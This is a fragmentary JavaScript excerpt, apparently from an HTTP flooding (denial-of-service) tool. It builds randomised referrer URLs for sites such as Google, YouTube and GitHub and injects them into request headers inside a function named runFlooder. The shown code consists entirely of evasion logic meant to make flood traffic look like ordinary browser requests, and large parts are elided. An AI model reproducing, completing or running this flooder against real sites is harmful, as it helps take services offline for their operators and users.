...
const referrers = [
  'https://google.com/search?q=' + Math.random().toString(36).substring(7),
  'https://youtube.com/watch?v=' + Math.random().toString(36).substring(11),
  'https://facebook.com/profile.php?id=' + Math.floor(Math.random() * 1000000),
  'https://twitter.com/home',
  'https://reddit.com/r/programming',
  'https://github.com/' + Math.random().toString(36).substring(2),
  'https://stackoverflow.com/questions/' + Math.floor(Math.random() * 10000000)
];
...
function runFlooder() {
  ...
  const rateHeaders = [
    ...
    {"DNT": "1"},
    {"TE": "trailers"},
    {"Referer": getRandomValue(referrers)},
  ];
